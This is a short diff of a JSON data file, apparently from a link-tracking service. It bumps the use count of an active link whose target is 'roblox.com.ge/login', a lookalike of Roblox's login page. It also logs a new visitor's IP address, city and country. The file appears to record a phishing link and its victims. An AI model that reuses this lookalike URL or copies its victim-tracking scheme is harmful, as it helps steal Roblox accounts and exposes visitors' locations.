@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1463,
+    "useCount": 1464,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11872,6 +11872,14 @@
         "city": "Angeles City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777436603564,
+        "ip": "187.187.231.107",
+        "country": "Mexico",
+        "city": "Ciudad del Carmen",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
